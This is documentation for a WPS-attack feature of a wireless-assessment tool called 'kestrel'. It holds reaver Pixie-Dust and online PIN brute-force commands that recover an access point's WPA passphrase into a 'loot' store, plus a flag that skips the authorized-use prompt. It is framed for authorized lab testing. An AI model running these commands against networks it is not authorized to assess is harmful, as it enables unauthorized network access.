# WPS attacks (reaver / Pixie-Dust)

> **Lab / authorized use only.** WPS attacks **transmit** at a specific access
> point. Only run them against networks you own or are explicitly authorized to
> assess. `kestrel wps` asks for the authorized-use acknowledgment before it
> touches the radio — the same one capture uses.

Many home routers leave **WPS** (Wi-Fi Protected Setup) enabled, and a WPS AP
can be made to hand over its WPA passphrase:

- **Pixie-Dust** (`-K`, the default): an *offline* attack. When the AP's WPS
  implementation is weak, reaver recovers the PIN — and from it the PSK — in
  seconds to minutes, without guessing against the live AP.
- **Online PIN** (`--no-pixie`): the classic brute force of the 8-digit PIN
  against the live AP. Slow (hours) and noisy, and modern APs lock WPS after a
  few bad PINs. Use it only when Pixie-Dust fails and the AP isn't locked.

A recovered key lands in the **same loot store** as cracked handshakes, so it
shows on the **Loot** page and in `kestrel crack list`, tagged `via WPS (pin …)`.

## The radio

WPS uses the **capture dongle** (e.g. the Alfa AWUS036ACM) in monitor mode, not
the Pi's built-in Wi-Fi. `kestrel wps` **pauses capture** for the duration and
restarts it (if it was running) when the attack finishes. One radio, one job at
a time — you are either capturing or running WPS, never both.

## Use it

Everything is one command — no service, nothing always-on.

```bash
# 1. Find WPS-enabled APs nearby (listens ~20s; pauses capture while scanning).
sudo kestrel wps scan
#   BSSID              Ch  RSSI  WPS  Lck  ESSID
#   AA:BB:CC:DD:EE:FF   6  -52   2.0  No   RouterX
#   ...

# 2. Attack one by BSSID. Pixie-Dust by default. Asks the authorized-use ack.
sudo kestrel wps attack AA:BB:CC:DD:EE:FF
#   ... reaver output ...
#   recovered PSK: 'letmein88' (WPS pin 12345670) -- saved to loot

# force the channel if the scan showed one (faster association):
sudo kestrel wps attack AA:BB:CC:DD:EE:FF --channel 6

# skip the ack prompt in a script you've already authorized:
sudo kestrel wps attack AA:BB:CC:DD:EE:FF --yes

# fall back to the slow online PIN brute force (only if Pixie-Dust failed
# and the AP is NOT WPS-locked):
sudo kestrel wps attack AA:BB:CC:DD:EE:FF --no-pixie

# 3. See what WPS has recovered (also on the Loot web page):
kestrel wps list
```

If an attack prints **"no key recovered"**, the AP is most likely WPS-locked
(the `Lck` column in the scan said `Yes`), not vulnerable to Pixie-Dust, or out
of range. A locked AP won't unlock until it's power-cycled or a lockout timer
expires — move on rather than hammering it.

## Config

`[wps]` in `/etc/kestrel/config.toml` only sets defaults; the flags above always
win:

```toml
[wps]
pixie_dust = true     # default to the offline Pixie-Dust attack (--no-pixie overrides)
scan_seconds = 20     # how long `kestrel wps scan` listens
```

## Release impact

**Reflash-class.** WPS adds the `reaver` and `pixiewps` apt packages, which the
in-field app-layer update engine does not install — it ships on a freshly
flashed image, not an in-place update.

## Not yet validated on hardware

The attack orchestration (monitor-mode switch, capture pause/restore, reaver
invocation) is implemented and unit-tested for command building, output parsing
and the loot write, but has **not** been run end-to-end against a real WPS AP on
a Pi yet. See `docs/developer/deferred.md`.
